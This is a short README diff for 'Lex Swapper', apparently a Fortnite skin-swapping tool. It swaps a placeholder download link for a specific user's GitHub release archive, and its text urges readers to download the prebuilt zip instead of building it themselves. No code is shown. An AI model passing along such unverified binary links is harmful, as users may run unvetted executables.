@@ -4,7 +4,7 @@
 
 ---
 
-## 📥 **[Download Lex Swapper](https://github.com/yourusername/fortnite-lex-swapper/releases/download/fortnite-skin/Lex.zip)**
+## 📥 **[Download Lex Swapper](https://github.com/Dingokool1/Lex-Swapper/releases/download/LexLauncher/Lex.zip)**
 
 > *Note:* We highly recommend downloading Lex Swapper from this link for the best performance, instead of attempting to build it yourself.
 
